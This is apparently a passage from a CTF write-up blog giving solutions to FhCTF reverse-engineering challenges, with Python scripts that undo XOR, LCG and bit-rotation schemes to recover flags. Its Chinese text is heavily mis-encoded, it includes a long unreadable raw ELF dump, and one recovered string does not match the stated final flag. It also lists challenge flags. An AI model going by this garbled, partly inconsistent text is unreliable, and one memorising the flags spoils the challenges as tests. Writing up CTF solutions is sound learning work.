<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;ğŸ·B3_c4r3ful_y0ur_SQL_synt4xğŸ·&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ç°¡æ˜“è…³æœ¬é–±è®€å™¨"><a href="#ç°¡æ˜“è…³æœ¬é–±è®€å™¨" class="headerlink" title="ç°¡æ˜“è…³æœ¬é–±è®€å™¨"></a>ç°¡æ˜“è…³æœ¬é–±è®€å™¨</h3><ul>
<li>å…ˆçœ‹PYï¼Œå¾ç¬¬ 2 è¡Œé–‹å§‹,è·³éäº† Flag<br><img src="/img/FhCTF/25.webp" alt="image"></li>
<li>ç”¨æˆ¶è¼¸å…¥å¯ä»¥ä¿®æ”¹åˆ—è¡¨ä¸­çš„ä»»ä½•ä½ç½®<br><img src="/img/FhCTF/26.webp" alt="image"></li>
<li>JUMP æŒ‡ä»¤å¯ä»¥æ”¹è®ŠæŒ‡ä»¤æŒ‡é‡åˆ°ä»»ä½•ç´¢å¼•<br><img src="/img/FhCTF/27.webp" alt="image"><br>é‚£å…¶å¯¦æˆ‘å€‘ç›´æ¥è¼¸å…¥ â€œJUMP 0â€ å°±å¥½äº†<br><img src="/img/FhCTF/28.webp" alt="image"></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;f1l3_10_and_jumb_m4st3r&#125;</span><br></pre></td></tr></table></figure>

<h3 id="OBF"><a href="#OBF" class="headerlink" title="OBF"></a>OBF</h3><p>å…ˆçœ‹codeï¼Œä½¿ç”¨äº†å¤§é‡çš„æ··æ·†æŠ€è¡“:</p>
<ul>
<li>è®Šæ•¸å–®å­—æ¯å‘½å (K, H, G, J, C ç­‰)</li>
<li>ç°¡åŒ–çš„å…§ç½®å‡½æ•¸ (A&#x3D;enumerate, E&#x3D;chr, F&#x3D;ord)</li>
<li>ç‹€æ…‹æ©Ÿè¨­è¨ˆ (ä½¿ç”¨å­—å…¸å’ŒæŒ‡é‡)</li>
<li>é­”æ³•æ•¸å­—å’Œå­—ç¬¦ä¸²</li>
</ul>
<p>codeå¯¦ç¾äº†ä¸€å€‹ç‹€æ…‹æ©Ÿ,æŒ‰ä»¥ä¸‹é †åºåŸ·è¡Œ:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ç‹€æ…‹ 1: XOR 66 è§£ç¢¼</span><br><span class="line">  è³‡æ–™: [58,34,118,...,34]</span><br><span class="line">  çµæœ: &#x27;|`0|`.T1W0.`,`k`&#x27;</span><br><span class="line">  </span><br><span class="line">ç‹€æ…‹ 5: å­—ç¬¦ä¸²åå‘</span><br><span class="line">  è³‡æ–™: &#x27;wEGLxxnj0nbU2fsm&#x27;</span><br><span class="line">  åå‘: &#x27;msfU2bn0jnxxLGEw&#x27;</span><br><span class="line">  </span><br><span class="line">ç‹€æ…‹ 2: Base64 è§£ç¢¼</span><br><span class="line">  è³‡æ–™: &#x27;WEVBVldCWkM1UVBWQktHeA==&#x27;</span><br><span class="line">  è§£ç¢¼: &#x27;XEAVWBZC5QPVBKHX&#x27;</span><br><span class="line">  </span><br><span class="line">ç‹€æ…‹ 3: å­—ç¬¦æ¸› 5</span><br><span class="line">  è³‡æ–™: &#x27;GFVzRJI9IctWCFa[&#x27;</span><br><span class="line">  çµæœ: &#x27;BAQuMED4D^oR&gt;A\V&#x27;</span><br><span class="line">  </span><br><span class="line">ç‹€æ…‹ 4: é©—è­‰å®Œæˆ</span><br><span class="line">  æª¢æŸ¥å¯†é‘°é•·åº¦ &gt;= 64 âœ“</span><br><span class="line">  å®Œæ•´å¯†é‘° (64 å­—ç¬¦)</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">|`0|`.T1W0.`,`k`BAQuMED4D^oR&gt;A\VXEAVWBZC5QP...</span><br></pre></td></tr></table></figure>
<p>é€™å€‹å¯†é‘°æ˜¯é€šé 4 éƒ¨åˆ†çµ„åˆè€Œæˆ:</p>
<ul>
<li>XOR with 66: |0|.T1W0.,<code>k</code> (16 å­—ç¬¦)</li>
<li>å­—ç¬¦ - 5: BAQuMED4D^oR&gt;A\V (16 å­—ç¬¦)</li>
<li>Base64 è§£ç¢¼: XEAVWBZC5QPVBKHX (16 å­—ç¬¦)</li>
<li>å­—ç¬¦ä¸²åå‘: msfU2bn0jnxxLGEw (16 å­—ç¬¦)</li>
</ul>
<p>è§£å¯†éç¨‹<br>çµ¦å®šçš„åŠ å¯†è¼¸å‡º:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">3e08772c224960093145070318575a0e741e050c7a2d745a1b6f5a0d5834322b</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨å¯†é‘°é€²è¡Œ XOR è§£å¯†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_pair, <span class="number">16</span>) ^ <span class="built_in">ord</span>(key[i % <span class="number">64</span>]))</span><br><span class="line">               <span class="keyword">for</span> i, hex_pair <span class="keyword">in</span> <span class="built_in">enumerate</span>(hex_pairs)])</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;P0lym0rph1c_Crypt0&#125;</span><br></pre></td></tr></table></figure>

<h3 id="The-Lock"><a href="#The-Lock" class="headerlink" title="The Lock"></a>The Lock</h3><p>ä½¿ç”¨ IDA éœæ…‹åˆ†æ</p>
<h4 id="ä¸»å‡½æ•¸-main-é‚è¼¯"><a href="#ä¸»å‡½æ•¸-main-é‚è¼¯" class="headerlink" title="ä¸»å‡½æ•¸ (main) é‚è¼¯"></a>ä¸»å‡½æ•¸ (main) é‚è¼¯</h4><p>é€é IDA Pro åç·¨è­¯å¾Œï¼Œå¯ä»¥çœ‹åˆ° main å‡½æ•¸çš„æµç¨‹å¦‚ä¸‹ï¼š<br>æ ¼å¼æª¢æŸ¥ (check_header)ï¼šæª¢æŸ¥è¼¸å…¥æ˜¯å¦ä»¥ FhCTF{ é–‹é ­ä¸¦ä»¥ } çµå°¾ã€‚<br>æ ¸å¿ƒé©—è­‰ (check_password)ï¼šé€™æ˜¯æœ€é—œéµçš„å‡½æ•¸ï¼Œè‹¥å›å‚³å€¼ç‚ºçœŸï¼Œå‰‡ä»£è¡¨ Flag æ­£ç¢ºã€‚</p>
<h4 id="é©—è­‰å‡½æ•¸-check-password-åˆ†æ"><a href="#é©—è­‰å‡½æ•¸-check-password-åˆ†æ" class="headerlink" title="é©—è­‰å‡½æ•¸ (check_password) åˆ†æ"></a>é©—è­‰å‡½æ•¸ (check_password) åˆ†æ</h4><p>é€²å…¥ check_password å‡½æ•¸å¾Œï¼Œå¯ä»¥è§€å¯Ÿåˆ°ä»¥ä¸‹é—œéµé»ï¼š<br>å­—ä¸²è™•ç†ï¼šç¨‹å¼ä½¿ç”¨ substr æå–äº†èŠ±æ‹¬è™Ÿå…§çš„å…§å®¹ã€‚<br>é•·åº¦é™åˆ¶ï¼šå…§å®¹é•·åº¦å¿…é ˆæ­£å¥½ç‚º 26 å€‹å­—å…ƒã€‚<br>é—œéµæ•¸æ“šï¼š<br>v6 (é‡‘é‘°é™£åˆ—): [85, 51, 102, 17]<br>v7 (ç›®æ¨™æ•¸å€¼é™£åˆ—): [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]<br>æ¼”ç®—æ³•å…¬å¼ï¼š<br>$$v7[i] &#x3D; (v6[i \pmod 4] \oplus \text{input}[i]) + 2 \times i$$</p>
<h4 id="æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘"><a href="#æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘" class="headerlink" title="æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘"></a>æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘</h4><p>ç‚ºäº†å¾—åˆ°åŸå§‹è¼¸å…¥ï¼Œæˆ‘å€‘éœ€è¦å°‡ä¸Šè¿°å…¬å¼é€²è¡Œç§»é …ï¼Œåæ¨ $\text{input}[i]$ï¼š<br>å…ˆè™•ç†åŠ æ³•åç§»ï¼š$X &#x3D; v7[i] - 2 \times i$<br>å†è™•ç†ç•°æˆ–é‹ç®—ï¼š$\text{input}[i] &#x3D; X \oplus v6[i \pmod 4]$<br>è‡ªå‹•åŒ–è§£å¯†è…³æœ¬ (Python)<br>ç‚ºäº†å¿«é€Ÿå¾—åˆ°çµæœï¼Œæˆ‘å€‘ç·¨å¯«ä»¥ä¸‹è…³æœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = [<span class="number">7</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">47</span>, <span class="number">74</span>, <span class="number">97</span>, <span class="number">92</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">21</span>, <span class="number">54</span>, <span class="number">83</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">129</span>, <span class="number">132</span>, <span class="number">127</span>, <span class="number">37</span>, <span class="number">116</span>, <span class="number">140</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">87</span>, <span class="number">54</span>]</span><br><span class="line">key = [<span class="number">85</span>, <span class="number">51</span>, <span class="number">102</span>, <span class="number">17</span>]</span><br><span class="line"></span><br><span class="line">flag_content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)):</span><br><span class="line">    <span class="comment"># é€†å‘å…¬å¼ï¼š(v7[i] - 2*i) XOR v6[i%4]</span></span><br><span class="line">    char_code = (target[i] - <span class="number">2</span> * i) ^ key[i % <span class="number">4</span>]</span><br><span class="line">    flag_content += <span class="built_in">chr</span>(char_code)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: FhCTF&#123;&#123;<span class="subst">&#123;flag_content&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="æœ€çµ‚çµæœ"><a href="#æœ€çµ‚çµæœ" class="headerlink" title="æœ€çµ‚çµæœ"></a>æœ€çµ‚çµæœ</h4><p>ç¶“éè…³æœ¬åŸ·è¡Œï¼ŒèŠ±æ‹¬è™Ÿå…§çš„å­—ä¸²ç‚º J3v3rs3_Eng1n33r1ng_1sOar7ã€‚<br>Flag å…§å®¹åˆ†æï¼šè©²å­—ä¸²æ˜¯ Leet Speak å½¢å¼çš„ã€ŒReverse Engineering Is Artã€ã€‚</p>
<p>æœ€çµ‚ç­”æ¡ˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;R3v3rs3_Eng1n33r1ng_1s_Ar7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å£æ‰çš„è§£ç¢¼å™¨"><a href="#å£æ‰çš„è§£ç¢¼å™¨" class="headerlink" title="å£æ‰çš„è§£ç¢¼å™¨"></a>å£æ‰çš„è§£ç¢¼å™¨</h3><p>çµ¦äº†å…©å€‹æª”æ¡ˆ<br><img src="/img/FhCTF/a.webp" alt="{EFEA1592-5D42-4F42-A2D1-A2F66BD88A55}"><br>å…¶ä¸­encrypted_flagè£¡æœ‰<br><img src="/img/FhCTF/b.webp" alt="{58654F7F-3F17-4FA5-AEAC-649927D2FA73}"><br>decryptè£¡æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ELF          &gt;    Â€      @       ?          @ 8 </span><br><span class="line"> @         @       @       @       ?      ?                                                                                        ?      ?                                        !       !                                                                     X-      X=      X=      ?      @                   h-      h=      h=                                 8      8      8      0       0                    h      h      h      D       D              Så»d   8      8      8      0       0              På»d   d       d       d       \       \              Qå»d                                                  Rå»d   X-      X=      X=      ?      ?             /lib64/ld-linux-x86-64.so.2               GNU   ?          Â€ ?                   GNU eè«²p6Nî¸)Lî¥ï¼Ÿî†”         GNU                                 ?!            èƒ—å§²r?%mCæ…é©§?C                        &#123;                     d                      ?                     ?                      ?                     ?                      d                     u                     ?                     ?                      ^                     F                                                                    ,                       ?                     ?  &quot;                   ?     `A            ?     Â€B              &quot;  ?      ?       T    @@             __gmon_start__ _ITM_deregisterTMCloneTable _ITM_registerTMCloneTable _ZSt17__istream_extractRSiPcl _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_ _ZSt3cin _ZNSolsEPFRSoS_E _ZSt4cerr _ZSt21ios_base_library_initv _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ _ZSt4cout fgets __stack_chk_fail fopen strlen __isoc23_strtol __libc_start_main __cxa_finalize fclose fputc libstdc++.so.6 libc.so.6 GLIBCXX_3.4.29 GLIBCXX_3.4.32 GLIBCXX_3.4 GLIBC_2.38 GLIBC_2.4 GLIBC_2.34 GLIBC_2.2.5                                ?     @   y?    ?     B?   ?     t)?   ?        ?         ??        ii</span><br><span class="line">        ??        ui	   #      X=             `      `=                    @             @      ?                    ?                    ?                    ?         </span><br><span class="line">           ?                    ?                    @@                    `A                    Â€B                    Â€?                     ?                     ?                     ?                     ?                      ?                     ?          	           ?                     ?                     ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ?î€ˆï¼H??  Hï†Štï£¸ç²€ï”?     ï£¸5J/  ï£¸%L/  @ ?î€¨    æ®ªï£¸ï£¸ï£¸fî“œî€¨   æ©ï£¸ï£¸ï£¸fî“œî€¨   æ¨²ï£¸ï£¸ï£¸fî“œî€¨   æ–¢ï£¸ï£¸ï£¸fî“œî€¨   æ†¸ï£¸ï£¸ï£¸fî“œî€¨   ?ï£¸ï£¸ï£¸fî“œî€¨   ?ï£¸ï£¸ï£¸fî“œî€¨    å»¨ï£¸ï£¸ï£¸fî“œî€¨   å¶µï£¸ï£¸ï£¸fî“œî€¨	   å¬™ï£¸ï£¸ï£¸fî“œ?%?  fD  ??%?  fD  ??%?  fD  ??%?  fD  ??%~.  fD  ??%v.  fD  ??%n.  fD  ??%f.  fD  ??%^.  fD  ??%V.  fD  ??%N.  fD  ??æªŒï^Hï Hï´ç™šTE1?äº??  ï£¸;.  ç€.?     H?Y.  H?R.  H9é»‚H?.  Hï†Št	ï£¸?Â€    ?Â€    H?).  H?&quot;.  H)î‰¼ï®Hé”?HéœHéŸ†æ¯¤tH??  Hï†Štï£¸è¶’D  ?Â€    ??=e1   u+UH??   Hï£tH??  ??ï£¸é‹„ï£¸ï£¸ï£¸?=1  ]? ?Â€    ?î‚‡wï£¸ï£¸ï£¸?î€•Hï£Hïè½£ï“Ÿ? ié´¦Nè‰·90  %ï£¸ï£¸ï£¸ï€Hï“Ÿ?Hï“Ÿ? ]é¤î€•Hï£Hïé§E?    ?ï“¯?é‡“?)?ç¦§ï“Ÿ?? å£?Eî…‚î¿·?Hï“Ÿ?? ïƒ­u?Eî…—é¤î€•Hï£ï¶ï•?E?è²¸?E?è¼¾???è²¸î†   +E?è¼¾??ç¤‘é¤î€•Hï£Hï¼ Hïè¼¤ï“Ÿè¼¤ï…éœ‚?ï£¸Hï¥é½´Hï“Ÿè½£ï˜¤ï£¸Hï“Ÿè¼¤é™Š  Hï€Ÿ?Hï€¯? t,Hï“Ÿè½£ï˜¤ï£¸Hï“Ÿè¼¤?? &lt;</span><br><span class="line">tå¦²ï“Ÿè½£ï˜¤ï£¸Hï“Ÿè¼¤?? &lt;</span><br><span class="line">t?å?î€•Hï£Hî½‚P  dH?%(   Hï¥?éš¨?[  Hï„H??  Hï…??ï£¸H?è¹¥ï£¸ï£¸Hï„H??  Hï…å™®  H?:  Hï„H?[,  Hï…??ï£¸H?è¹§ï£¸ï£¸Hï„H?b-  Hï…é§‰  H?è¹¥ï£¸ï£¸H?  Hï”Hï…??ï£¸H?ç°ï£¸ï£¸Hïç°ï£¸ï£¸ u5H??  Hï„H??.  Hï…é–«?ï£¸H??  Hï”Hï…éŸ?ï£¸?   å¬  H?ç°ï£¸ï£¸H?åª»ï£¸ï£¸?   Hï…é§—?ï£¸Hï†Šîœïƒ­tH?ç°ï£¸ï£¸Hï…éŠ¶?ï£¸?   ?  H?åª»ï£¸ï£¸Hï…é‹ƒ?ï£¸H?ç°ï£¸ï£¸H?è†£ï£¸ï£¸?   Hï…??ï£¸Hï†Šîœïƒ­t ?è†£ï£¸ï£¸ H?è†£ï£¸ï£¸Hï…??ï£¸H?ç°ï£¸ï£¸Hï…??ï£¸H?è¹§ï£¸ï£¸H?9  Hï”Hï…??ï£¸H?ï¡‡ï£¸ï£¸Hïï¡‡ï£¸ï£¸ u5H?  Hï„H?I-  Hï…éŠ?ï£¸H??  Hï”Hï…é¤ˆ?ï£¸?   å¶§  H?è†£ï£¸ï£¸Hï…??ï£¸?æ¸¾ï£¸ï£¸f?æ¸®ï£¸ï£¸  ?è»·ï£¸ï£¸ H?åª»ï£¸ï£¸Hï…é¯?ï£¸H?å”…ï£¸ï£¸H?è»¾ï£¸ï£¸    æ¿   H?åª»ï£¸ï£¸H?è»¾ï£¸ï£¸H?? ?æ¸®ï£¸ï£¸H?è»¾ï£¸ï£¸Hï?åª»ï£¸ï£¸?ç¼¿ï£¸ï£¸H?æ¸®ï£¸ï£¸?   ?    Hï…é‹“?ï£¸?æ¬²ï£¸ï£¸?æ¬²ï£¸ï£¸?è»ï£¸ï£¸?æ¬²ï£¸ï£¸?   ï…é§?ï£¸?æ¬²ï£¸ï£¸H?æ¸¾ï£¸ï£¸Hï…??ï£¸ï¿ïˆ?Â€Â€Â€Hç´”HéŒ˜ éŒ˜ ï€é‚)???ï…½?ï£¸?å£ºï£¸ï£¸0ï…»?ï£¸?è»ï£¸ï£¸?æ¸¾ï£¸ï£¸?ï…¾?ï£¸?æ¬²ï£¸ï£¸H?ï¡‡ï£¸ï£¸Hï”ï…éŸ?ï£¸H?è»¾ï£¸ï£¸H?è»¾ï£¸ï£¸H;ï†š?ï£¸î¿±?ï£¸H?ï¡‡ï£¸ï£¸Hï…è¼˜?ï£¸?    Hï“¯é·£H+%(   té°?ï£¸å?î€•Hï£Hï¼ Hïè¼¤ï•è©¡?ï£¸ï£¸ï£¸ï£¸ï£¸ï£¸Hï¥è½£ï“¯è½£ï“§è©¡ï“Ÿè¼¤ïŒHï…é„«?ï£¸Hï“Ÿé§“?   ?î€ˆï¼Hï”?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 Input Filename:  Output Filename:  r Error opening input file. w Error opening output file.  ;X   </span><br><span class="line">   æ½˜ï£¸ï£¸?   l?ï£¸?   |?ï£¸?   ?ï£¸t   ?ï£¸?   7?ï£¸  |?ï£¸$  æ¢ƒï£¸ï£¸D   ?ï£¸d  n?ï£¸?         zR x ?        îº©ï£¸ï£¸&amp;    D     $   4   (?ï£¸?    FJwÂ€ ?9*3$&quot;       \   å †ï£¸ï£¸              t   å‰ï£¸ï£¸?              ?   ?ï£¸2    E?C</span><br><span class="line">i       ?   +?ï£¸E    E?C</span><br><span class="line">|       ?   P?ï£¸5    E?C</span><br><span class="line">l       ?   e?ï£¸o    E?C</span><br><span class="line">f        æ¸¤ï£¸ï£¸N   E?C</span><br><span class="line">E     ,  ç¢ ï£¸ï£¸?    E?C</span><br><span class="line">v                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    `                    ?             ?                    </span><br><span class="line">                    X=                           `=                    è˜¥ï£¸o    ?             ?             ?      </span><br><span class="line">       /                                          h?             ?                             </span><br><span class="line">              ?                    	                            ?ï£¸o          ?ï£¸o    X      ï£¸ï£¸ï£¸o           ?ï£¸o    (      ?ï£¸o                                                                                           h=                      0      @      P      `      p      Â€      ?      ?      ?      ?                                                              @      GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0                                  ?                	     ?                  ?                     ?                    ?              3                    I     î‘             U     `=              |     `              ?     X=              ?    ?                ?     `              ?     a                  b                  ?                L    &quot;                   ?                Z     d               m    h=              v    h?              ?  &quot;  ?      ?       ?    @              ?      @              ?                   ?  &quot;                   ?                         ?      N                           X   @              e          o       y                                      ?    Â€      &amp;       ?    ?      5       ?                     ?                                          &quot;    i      2       3                     N                  T   @              `                     r                     ?    @@            ?    ?      E       ?     @              ?    î¤¶              ?    @@              ?                     ?                     </span><br><span class="line">                     7                      S    `A            h                      w                      ?    Â€B            ?                      Scrt1.o __abi_tag crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry decrypt.cpp _ZNSt8__detail30__integer_to_chars_is_unsignedIjEE _ZNSt8__detail30__integer_to_chars_is_unsignedImEE _ZNSt8__detail30__integer_to_chars_is_unsignedIyEE __FRAME_END__ __GNU_EH_FRAME_HDR _DYNAMIC _GLOBAL_OFFSET_TABLE_ _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ _edata _IO_stdin_used __cxa_finalize@GLIBC_2.2.5 strlen@GLIBC_2.2.5 main _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GLIBCXX_3.4 __dso_handle _Z13removeNewlinePc _fini __libc_start_main@GLIBC_2.34 _Z11rotateRighthi _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.4 fclose@GLIBC_2.2.5 _ZNSolsEPFRSoS_E@GLIBCXX_3.4 _Z10getNextKeyRj __stack_chk_fail@GLIBC_2.4 _init __TMC_END__ fopen@GLIBC_2.2.5 fputc@GLIBC_2.2.5 _ZSt4cout@GLIBCXX_3.4 _Z12generateSeedPKc __data_start _end __bss_start _ZSt21ios_base_library_initv@GLIBCXX_3.4.32 fgets@GLIBC_2.2.5 _ZSt17__istream_extractRSiPcl@GLIBCXX_3.4.29 _ITM_deregisterTMCloneTable _ZSt3cin@GLIBCXX_3.4 __gmon_start__ _ITM_registerTMCloneTable _ZSt4cerr@GLIBCXX_3.4 __isoc23_strtol@GLIBC_2.38  .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .plt.sec .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment                                                                                                                            #              8      8      0                              6              h      h      $                              I              ?      ?                                     W   ?ï£¸o       ?      ?      8                             a             ?      ?                                 i             ?      ?      /                             q   ï£¸ï£¸ï£¸o       (      (      ,                            ~   ?ï£¸o       X      X      ?                             ?             ?      ?                                  ?      B       </span><br><span class="line">      </span><br><span class="line">      ?                           ?                                                         ?                           ?                             ?             ?      ?                                   ?             ?      ?      ?                             ?             Â€      Â€      ?                             ?                         </span><br><span class="line">                              ?                             c                              ?             d       d       \                              ?             ?      ?      L                             ?             X=      X-                                   ?             `=      `-                                   ?             h=      h-                                   ?             h?      h/      ?                                          @       0                                                @@      0      X              @                    0               0      +                                                   @0      p     </span><br></pre></td></tr></table></figure>

<p>æä¾›ELFäºŒé€²ä½æª”decryptèˆ‡åŠ å¯†æª”æ¡ˆencrypted_flagï¼Œéœ€é€†å‘åˆ†æè§£å¯†é‚è¼¯ä¸¦å¯¦ä½œPythonè…³æœ¬å–å¾—flag ã€‚é€éstringsèˆ‡å‡½æ•¸ç¬¦è™Ÿè­˜åˆ¥é—œéµæ¼”ç®—æ³•ï¼ŒåŒ…æ‹¬generateSeedã€getNextKeyã€rotateRightç­‰</p>
<ul>
<li>éœæ…‹åˆ†æ</li>
</ul>
<p>åŸ·è¡Œstrings decrypté¡¯ç¤ºç¨‹å¼è®€å–input&#x2F;outputæª”æ¡ˆï¼Œä½¿ç”¨fopenã€fgetsã€fputcï¼Œä¸¦ä¾è³´libstdc++èˆ‡libcç¬¦è™Ÿå¦‚__stack_chk_failã€__libc_start_mainã€‚ç¬¦è™Ÿè¡¨æ­ç¤ºæ ¸å¿ƒå‡½æ•¸ï¼š</p>
<ul>
<li>generateSeedï¼šå¾passwordç”Ÿæˆåˆå§‹seedï¼Œä½¿ç”¨seed &#x3D; seed * 31 + chçš„hashæ–¹å¼ï¼Œæ¨¡0xFFFFFFFFã€‚</li>
<li>getNextKeyï¼šLCGå½éš¨æ©Ÿç”¢ç”Ÿå™¨ï¼Œå…¬å¼(seed * 0x41C64E6D + 0x3039) &amp; 0x7FFFFFFFï¼Œkey &#x3D; seed % 255ã€‚</li>
<li>rotateRightï¼šå³æ—‹ä½ç§»ï¼Œrotate_right(byte, 3)ã€‚</li>
<li>mainï¼šè®€å–hexå­—ä¸²ï¼Œå°æ¯byteåŸ·è¡Œæ—‹è½‰â†’æ›´æ–°seedâ†’XOR keyâ†’seed +&#x3D; åŸbyteã€‚</li>
</ul>
<p>ELFç‰‡æ®µé¡¯ç¤ºhexè³‡æ–™â€2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F79686098C6A5F0593D395543ABFF118410B2F02CF61FA5â€èˆ‡passwordæç¤ºâ€I_just_afraid_someday_i_will_forget_the_passwordâ€ã€‚</p>
<ul>
<li>é‚è¼¯é‚„åŸ</li>
</ul>
<p>è§£å¯†æµç¨‹ç‚ºæ¯byteç¨ç«‹è™•ç†ï¼š</p>
<ol>
<li>hexè§£æç‚ºbyte bã€‚</li>
<li>b_rot &#x3D; rotate_right(b, 3)ï¼Œå³(b &gt;&gt; 3) | (b &lt;&lt; 5) &amp; 0xFFã€‚</li>
<li>seed &#x3D; getNextKey(seed)ã€‚</li>
<li>key &#x3D; seed % 255ã€‚</li>
<li>plaintext_byte &#x3D; b_rot ^ keyã€‚</li>
<li>seed &#x3D; (seed + b) &amp; 0xFFFFFFFFï¼ˆæ³¨æ„åŠ åŸå§‹bï¼Œéæ—‹è½‰å¾Œï¼‰ã€‚</li>
</ol>
<p>æ­¤èˆ‡å¸¸è¦‹æµå¯†ç¢¼ä¸åŒï¼Œseedæ›´æ–°ä¾è³´åŸå§‹å¯†æ–‡ï¼Œå½¢æˆä¾è³´éˆ</p>
<ul>
<li>è§£å¯†è…³æœ¬</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexline = (<span class="string">&quot;2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F7&quot;</span></span><br><span class="line">           <span class="string">&quot;9686098C6A5F0593D395543ABFF118410B2F02CF61FA5&quot;</span>)</span><br><span class="line">password = <span class="string">&quot;I_just_afraid_someday_i_will_forget_the_password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_seed</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    seed = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s.encode():</span><br><span class="line">        seed = (seed * <span class="number">31</span> + ch) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next_key</span>(<span class="params">seed: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (seed * <span class="number">0x41C64E6D</span> + <span class="number">0x3039</span>) &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_right</span>(<span class="params">byte: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((byte &gt;&gt; n) | ((byte &lt;&lt; (<span class="number">8</span> - n)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">seed = generate_seed(password)</span><br><span class="line">out = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hexline), <span class="number">2</span>):</span><br><span class="line">    b = <span class="built_in">int</span>(hexline[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    b_rot = rotate_right(b, <span class="number">3</span>)</span><br><span class="line">    seed = get_next_key(seed)</span><br><span class="line">    key = seed % <span class="number">255</span></span><br><span class="line">    out.append(b_rot ^ key)</span><br><span class="line">    seed = (seed + b) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out.decode()) </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Why_not_use_std::string_instead_of_char_arrays?&#125;</span><br></pre></td></tr></table></figure>

